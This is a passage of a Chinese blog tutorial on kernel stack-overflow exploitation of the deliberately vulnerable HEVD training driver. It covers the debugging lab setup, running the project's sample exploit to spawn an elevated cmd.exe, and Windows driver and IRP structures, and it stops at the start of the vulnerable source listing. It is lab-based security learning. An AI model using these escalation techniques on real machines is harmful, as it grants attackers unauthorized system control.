<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ddd">
<meta property="og:type" content="article">
<meta property="og:title" content="[HEVD]第一个栈溢出">
<meta property="og:url" content="https://ixout.github.io/posts/2423/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="ddd">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213907.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213425.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213953.png">
<meta property="og:image" content="c:\Users\Aichengchao\AppData\Roaming\Typora\typora-user-images\image-20250113214118740.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214656.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214957.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_215318.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_215748.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_220207.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_105938.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_144444.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_151441.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_164121.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_212449.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_221518.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_221904.png">
<meta property="article:published_time" content="2025-01-13T12:12:43.000Z">
<meta property="article:modified_time" content="2025-02-12T08:02:24.916Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="windwos">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213907.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
        
      
    
    <!-- title -->
    <title>[HEVD]第一个栈溢出</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/posts/40120/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/2423/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/2423/&text=[HEVD]第一个栈溢出"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/2423/&is_video=false&description=[HEVD]第一个栈溢出"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=[HEVD]第一个栈溢出&body=Check out this article: https://ixout.github.io/posts/2423/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/2423/&name=[HEVD]第一个栈溢出&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/2423/&t=[HEVD]第一个栈溢出"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E8%B0%83%E8%AF%95%E6%96%B9"><span class="toc-number">1.1.</span> <span class="toc-text">被调试方</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.</span> <span class="toc-text">其他工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%86%9F%E6%82%89HEVD"><span class="toc-number">2.</span> <span class="toc-text">熟悉HEVD</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A9%B1%E5%8A%A8%E8%A3%85%E8%BD%BD"><span class="toc-number">2.1.</span> <span class="toc-text">驱动装载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B7%E4%BE%8Bexp"><span class="toc-number">2.2.</span> <span class="toc-text">样例exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">3.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A9%B1%E5%8A%A8%E7%BB%93%E6%9E%84"><span class="toc-number">3.1.</span> <span class="toc-text">驱动结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IRP"><span class="toc-number">3.2.</span> <span class="toc-text">IRP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86"><span class="toc-number">3.3.</span> <span class="toc-text">x86</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.1.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x64"><span class="toc-number">3.4.</span> <span class="toc-text">x64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kaslr"><span class="toc-number">3.4.1.</span> <span class="toc-text">kaslr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp1"><span class="toc-number">3.4.2.</span> <span class="toc-text">exp1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode"><span class="toc-number">3.4.2.1.</span> <span class="toc-text">shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp2"><span class="toc-number">3.4.3.</span> <span class="toc-text">exp2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E9%85%8D%E5%86%85%E6%A0%B8%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98"><span class="toc-number">3.4.3.1.</span> <span class="toc-text">分配内核可执行内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEgadget"><span class="toc-number">3.4.3.2.</span> <span class="toc-text">寻找gadget</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        [HEVD]第一个栈溢出
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ixout</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-13T12:12:43.000Z" class="dt-published" itemprop="datePublished">2025-01-13</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/bin/">bin</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/windwos/" rel="tag">windwos</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>环境的准备较为简单</p>
<h2 id="被调试方"><a href="#被调试方" class="headerlink" title="被调试方"></a>被调试方</h2><p>之前学linux内核使用的是qemu仿真,对于windows来说就不那么适合了,所以还是在vmware中增加一个虚拟机</p>
<p>HEVD提供了x64和x32的版本,所以我们准备两个被调试环境,分别是win7_x32和win10_x64</p>
<p>构建调试环境参考博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43790779/article/details/115873938">WinDbg 双机调试（调试机为Windows10系统，被调试机为Windows7系统）</a></p>
<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><ol>
<li>KmdManager,用于加载驱动</li>
<li>DebugView,在被调试方也显示内核调试信息</li>
<li>windbg</li>
<li>virtualKD-redux,windows内核调试神器,如果受不了windbg正常调试时的逆天延迟,推荐该工具</li>
</ol>
<h1 id="熟悉HEVD"><a href="#熟悉HEVD" class="headerlink" title="熟悉HEVD"></a>熟悉HEVD</h1><p>HEVD仓库</p>
<p><a target="_blank" rel="noopener" href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">hacksysteam/HackSysExtremeVulnerableDriver：HackSys Extreme Vulnerable Driver (HEVD) - Windows &amp; Linux </a></p>
<h2 id="驱动装载"><a href="#驱动装载" class="headerlink" title="驱动装载"></a>驱动装载</h2><p>下载release中已经编译好的驱动</p>
<p>管理员身份打开DebugView并勾选如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213907.png" alt=""></p>
<p>管理员身份打开KmdManager,选择带有漏洞的x86版本驱动加载</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213425.png" alt=""></p>
<p>注意,只有在被调试器附加的情况下,驱动才能成功加载</p>
<p>成功加载时就能在windbg或Debugview中看到banner了</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213953.png" alt=""></p>
<p>在windbg中使用命令<code>lm m H*</code>也能看到其已经成功加载</p>
<p><img src="C:\Users\Aichengchao\AppData\Roaming\Typora\typora-user-images\image-20250113214118740.png" alt="image-20250113214118740"></p>
<p>此时驱动是尚未加载符号的</p>
<p>使用命令确认符号加载路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!sym noisy</span><br><span class="line">x /D HEVD!</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214656.png" alt=""></p>
<p>那么创建<code>符号文件路径\HEVD.pdb\XXXXXXX</code>路径,并将下载的pdb文件移动到此处</p>
<p><code>.reload</code>重新加载后再次执行命令<code>x /D HEVD!</code>,即可查看HEVD的所有符号</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214957.png" alt=""></p>
<p><code>!drvobj HEVD 2</code>查看驱动详细信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_215318.png" alt=""></p>
<h2 id="样例exp"><a href="#样例exp" class="headerlink" title="样例exp"></a>样例exp</h2><p>克隆仓库</p>
<p>vs studio打开exploit目录下的项目文件</p>
<p>选择release版本编译生成,获得exp样例,</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_215748.png" alt=""></p>
<p>使用命令<code>HackSysEVDExploit.exe -c cmd.exe -s</code>测试</p>
<p>成功提权</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_220207.png" alt=""></p>
<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="驱动结构"><a href="#驱动结构" class="headerlink" title="驱动结构"></a>驱动结构</h2><p>windows内核采用c实现面向对象的编程模式</p>
<p>驱动对象：一个驱动对象就对应一个驱动程序，在Windows中加载这样一个结构，实际上时告诉系统需要提供哪些东西。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span>  </span><br><span class="line"> <span class="comment">//  结构的类型和大小。  </span></span><br><span class="line">      CSHORT Type;  </span><br><span class="line">      CSHORT Size;  </span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* 设备对象的指针，注意这里实际上是一个设备对象的链表的开始。</span></span><br><span class="line"><span class="comment">一个驱动程序可以拥有多个设备对象，并且这些对象用链表的形式连接起来。*/</span></span><br><span class="line">      PDEVICE_OBJECT DeviceObject;  </span><br><span class="line">  ……  </span><br><span class="line">  <span class="comment">//  驱动的名字  </span></span><br><span class="line">      UNICODE_STRING DriverName;  </span><br><span class="line">  ……  </span><br><span class="line">  <span class="comment">//  快速 IO分发函数  </span></span><br><span class="line">      PFAST_IO_DISPATCH FastIoDispatch;  </span><br><span class="line">   ……  </span><br><span class="line"> <span class="comment">//  驱动的卸载函数  </span></span><br><span class="line">      PDRIVER_UNLOAD DriverUnload;  </span><br><span class="line">  <span class="comment">//  普通分发函数  </span></span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];  </span><br><span class="line">&#125; DRIVER_OBJECT;</span><br></pre></td></tr></table></figure>
<p> 设备对象：这里我们可以类比为windowsGUI编程中的窗口,任何消息都发送给窗口，窗口也是唯一用来接收消息的东西，而设备对象也是唯一用来接收设备请求的实体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title function_">DECLSPEC_ALIGN</span><span class="params">(MEMORY_ALLOCATION_ALIGNMENT)</span> _DEVICE_OBJECT  </span><br><span class="line">&#123;</span><br><span class="line">  CSHORT Type;  </span><br><span class="line">  USHORT Size;     </span><br><span class="line">  <span class="comment">//  引用计数，当引用计数为0的时候此对象被销毁  </span></span><br><span class="line">  ULONG ReferenceCount;     </span><br><span class="line">  <span class="comment">//  这个设备所属的驱动对象  </span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">DriverObject</span>;</span>  </span><br><span class="line">  <span class="comment">//  下一个设备对象。在一个驱动对象中有n 个设备，这些设备用这个指针连接  </span></span><br><span class="line">  <span class="comment">//  起来作为一个单向的链表。  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">DEVICE_OBJECT</span> *<span class="title">NextDevice</span>;</span>   </span><br><span class="line">  <span class="comment">//  设备类型  </span></span><br><span class="line">  DEVICE_TYPE DeviceType;     </span><br><span class="line">  <span class="comment">// IRP栈大小  </span></span><br><span class="line">  HAR StackSize;       </span><br><span class="line">  ……  </span><br><span class="line">&#125;DEVICE_OBJECT;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>设备</strong> 是硬件或虚拟实体的抽象表示，由设备对象表示</li>
<li><strong>驱动程序</strong> 是操作系统与设备之间的桥梁，负责管理和控制设备的行为,与设备是一对多的关系</li>
</ul>
<h2 id="IRP"><a href="#IRP" class="headerlink" title="IRP"></a>IRP</h2><p><code>IRP</code>（I/O Request Packet，I/O 请求包）是 Windows 操作系统中用于表示 I/O 请求的核心数据结构。I/O管理器通过一系列内核模式下的例程发起I/O请求，并且为用户模式下的进程提供了统一的接口。IRP是一种请求的形式。</p>
<p>驱动与驱动之间，驱动与用户层之间都是直接或者间接通过IRP进行通讯的。</p>
<p>IRP具体由两部分组成：头部区域和I/O堆栈（IO_STACK_LOCATIONS）。</p>
<p>头部区域是一个_IRP结构。I/O堆栈则是一个IO_STACK_LOCATIONS的结构体数组，这个数组的大小由IoAllocateIrp创建IRP时所决定。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_105938.png" alt=""></p>
<p>驱动对象会创建一个又一个的设备对象，这些设备对象通过链表的数据结构堆叠成一个垂直的结构，这个结构被称为设备栈。IRP会被操作系统送到栈顶。然后通过设备堆栈一层一层向下转发处理，直至这次I/O请求结束。</p>
<p>不同的IRP数据会按照类型传递到不同的派遣函数中。常见有5种IRP结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE 0X00 <span class="comment">//对应用户层函数CreateFile()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE  0X02 <span class="comment">//对应用户层函数CloseHandle()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_READ 0X03 <span class="comment">//对应用户层函数ReadFile()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_WRITE 0X04 <span class="comment">//对应用户层函数WirteFile()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL 0X0e <span class="comment">//DeviceIoControl()</span></span></span><br></pre></td></tr></table></figure>
<p>看其定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span> &#123;</span></span><br><span class="line">    PMDL              MdlAddress;</span><br><span class="line">    ULONG             Flags;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span>*   <span class="title">MasterIrp</span>;</span></span><br><span class="line">        PVOID          SystemBuffer;</span><br><span class="line">    &#125; AssociatedIrp;</span><br><span class="line">    IO_STATUS_BLOCK   IoStatus;</span><br><span class="line">    KPROCESSOR_MODE   RequestorMode;</span><br><span class="line">    BOOLEAN           PendingReturned;</span><br><span class="line">    BOOLEAN           Cancel;</span><br><span class="line">    KIRQL             CancelIrql;</span><br><span class="line">    PDRIVER_CANCEL    CancelRoutine;</span><br><span class="line">    PVOID             UserBuffer;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                KDEVICE_QUEUE_ENTRY DeviceQueueEntry;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    PVOID    DriverContext[<span class="number">4</span>];</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            PETHREAD     Thread;</span><br><span class="line">            LIST_ENTRY   ListEntry;</span><br><span class="line">        &#125; Overlay;</span><br><span class="line">    &#125; Tail;</span><br><span class="line">&#125; IRP, *PIRP;</span><br></pre></td></tr></table></figure>
<p>IRP有三个描述缓冲区的位置</p>
<ul>
<li><p><code>irp-&gt;AssociatedIrp.SystemBuffer</code></p>
<p>一般用于比较简单且不追求效率情况下的解决方案,I/O 管理器会将用户模式的输入缓冲区和输出缓冲区都复制到内核模式的非分页池中。</p>
</li>
<li><p><code>irp-&gt;MdlAddress</code></p>
<p>通过构造MDL就能实现这个R3到R0的地址映射功能。MDL可以翻译为”内存描述符链”，本质上就是一个指针，从这个MDL中可以读出一个内核空间的虚拟地址。这就弥补了UserBuffer的不足，同时比SystemBuffer的完全拷贝方法要轻量，因为这个内存实际上还是在老地方，没有拷贝。</p>
</li>
<li><p><code>irp-&gt;UserBuffer</code></p>
<p>I/O 管理器直接将用户模式的缓冲区地址传递给驱动程序，不进行任何复制或锁定,最低安全性,最高性能</p>
</li>
</ul>
<p>接下来再看十分重要的一个结构<code>IRPsp</code>,其结构类型是<code>IO_STACK_LOCATION</code>,它是 Windows 内核中与 <strong>IRP</strong>（I/O Request Packet）密切相关的数据结构，用于存储与当前 I/O 请求相关的信息。每个 IRP 都包含一个或多个 <code>IO_STACK_LOCATION</code> 结构，这些结构构成了一个堆栈，用于在设备栈中传递 I/O 请求，每个设备对象都会处理对应的 <code>IO_STACK_LOCATION</code></p>
<p>为什么有了IRP还需要IRPsp,因为IRP实际上只是相当于一个头部结构,用来描述整个请求,至于更细节的信息则需要其他的结构负责</p>
<p>可以如下获取IRP对应的IRPsp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);</span><br></pre></td></tr></table></figure>
<p><code>IO_STACK_LOCATION</code>的定义十分长,可以在<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">IO_STACK_LOCATION （wdm.h） - Windows drivers | Microsoft Learn</a>查看完整的定义</p>
<p>这里只介绍一些关键字段</p>
<ol>
<li><strong><code>MajorFunction</code></strong><ul>
<li>表示当前 I/O 请求的主功能代码。常见的值包括：<ul>
<li><code>IRP_MJ_CREATE</code>：打开设备或文件。</li>
<li><code>IRP_MJ_READ</code>：读取数据。</li>
<li><code>IRP_MJ_WRITE</code>：写入数据。</li>
<li><code>IRP_MJ_DEVICE_CONTROL</code>：设备控制请求（IOCTL）。</li>
<li><code>IRP_MJ_CLOSE</code>：关闭设备或文件。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>MinorFunction</code></strong><ul>
<li>表示当前 I/O 请求的次功能代码。通常用于扩展主功能代码的行为。</li>
</ul>
</li>
<li><strong><code>Parameters</code></strong><ul>
<li>一个联合体（union），根据 <code>MajorFunction</code> 的不同，存储与 I/O 请求相关的参数。例如：<ul>
<li>对于 <code>IRP_MJ_READ</code>，存储读取的长度、偏移量等信息。</li>
<li>对于 <code>IRP_MJ_DEVICE_CONTROL</code>，存储 IOCTL 控制代码、输入/输出缓冲区长度等信息。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>DeviceObject</code></strong><ul>
<li>指向当前设备对象的指针。</li>
</ul>
</li>
<li><strong><code>FileObject</code></strong><ul>
<li>指向与当前 I/O 请求相关的文件对象的指针</li>
</ul>
</li>
</ol>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>接下来看最简单的一个案例,在几乎没有检查和保护的情况下完成一次内核栈溢出利用</p>
<p>漏洞源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 